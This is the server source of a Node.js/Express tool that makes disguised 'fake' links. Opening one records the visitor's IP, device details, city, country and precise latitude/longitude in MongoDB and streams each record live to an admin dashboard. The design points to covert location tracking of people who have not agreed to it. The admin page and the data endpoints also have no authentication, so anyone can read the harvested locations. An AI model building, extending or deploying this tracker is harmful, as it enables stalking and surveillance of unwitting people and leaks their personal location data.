const express = require('express');
const mongoose = require('mongoose');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://cdnjs.cloudflare.com", "https://unpkg.com"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://cdnjs.cloudflare.com", "https://unpkg.com"],
      connectSrc: ["'self'", "https://ipapi.co", "https://{s}.tile.openstreetmap.org"],
      fontSrc: ["'self'", "https://cdnjs.cloudflare.com"],
      imgSrc: ["'self'", "data:", "https:", "https://{s}.tile.openstreetmap.org"],
    },
  },
}));
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// MongoDB connection
const mongoUri = process.env.MONGODB_URI || process.env.MONGO_URL || 'mongodb://localhost:27017/location_tracker';
console.log('Connecting to MongoDB:', mongoUri);
mongoose.connect(mongoUri, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  serverSelectionTimeoutMS: 5000,
  socketTimeoutMS: 45000,
}).then(() => {
  console.log('MongoDB connected successfully');
}).catch((error) => {
  console.error('MongoDB connection error:', error);
});

// Schema for tracking data
const trackingSchema = new mongoose.Schema({
  linkId: String,
  ip: String,
  userAgent: String,
  location: {
    latitude: Number,
    longitude: Number,
    accuracy: Number
  },
  timestamp: { type: Date, default: Date.now },
  city: String,
  country: String,
  browser: String,
  os: String
});

const TrackingData = mongoose.model('TrackingData', trackingSchema);

// Schema for generated links
const linkSchema = new mongoose.Schema({
  linkId: String,
  originalUrl: String,
  fakeUrl: String,
  clicks: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const GeneratedLink = mongoose.model('GeneratedLink', linkSchema);

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Generate fake link
app.post('/api/generate-link', async (req, res) => {
  try {
    console.log('Generate link request received:', req.body);
    const { originalUrl } = req.body;
    
    if (!originalUrl) {
      return res.status(400).json({ success: false, error: 'Original URL is required' });
    }
    
    const linkId = uuidv4();
    const fakeUrl = `${req.protocol}://${req.get('host')}/track/${linkId}`;
    
    console.log('Creating new link:', { linkId, originalUrl, fakeUrl });
    
    const newLink = new GeneratedLink({
      linkId,
      originalUrl,
      fakeUrl
    });
    
    await newLink.save();
    console.log('Link saved successfully:', newLink);
    res.json({ success: true, fakeUrl, linkId });
  } catch (error) {
    console.error('Error generating link:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Track link click
app.get('/track/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    const link = await GeneratedLink.findOne({ linkId });
    
    if (!link) {
      return res.status(404).send('Link not found');
    }
    
    // Update click count
    link.clicks += 1;
    await link.save();
    
    // Send tracking page
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
  } catch (error) {
    res.status(500).send('Error processing link');
  }
});

// Save tracking data
app.post('/api/track', async (req, res) => {
  try {
    console.log('Tracking data received:', req.body);
    const { linkId, location, userAgent, browser, os, ip: clientIp, city, country } = req.body;
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress || clientIp;
    
    console.log('Processing tracking data:', { linkId, ip, location, browser, os });
    
    const trackingData = new TrackingData({
      linkId,
      ip,
      userAgent,
      location,
      browser,
      os,
      city,
      country
    });
    
    await trackingData.save();
    console.log('Tracking data saved successfully:', trackingData);
    
    // Emit real-time update to admin dashboard
    io.emit('newTrackingData', trackingData);
    console.log('Real-time update sent to admin dashboard');
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error saving tracking data:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all tracking data
app.get('/api/tracking-data', async (req, res) => {
  try {
    console.log('Fetching tracking data...');
    const data = await TrackingData.find().sort({ timestamp: -1 });
    console.log('Found tracking data:', data.length, 'records');
    res.json(data);
  } catch (error) {
    console.error('Error fetching tracking data:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get all generated links
app.get('/api/links', async (req, res) => {
  try {
    console.log('Fetching generated links...');
    const links = await GeneratedLink.find().sort({ createdAt: -1 });
    console.log('Found links:', links.length, 'records');
    res.json(links);
  } catch (error) {
    console.error('Error fetching links:', error);
    res.status(500).json({ error: error.message });
  }
});

// Get original URL for redirect
app.get('/api/get-original-url/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    const link = await GeneratedLink.findOne({ linkId });
    
    if (!link) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    res.json({ success: true, originalUrl: link.originalUrl });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Socket.io connection for real-time updates
io.on('connection', (socket) => {
  console.log('Admin connected');
  
  socket.on('disconnect', () => {
    console.log('Admin disconnected');
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Admin dashboard: http://localhost:${PORT}/admin`);
});
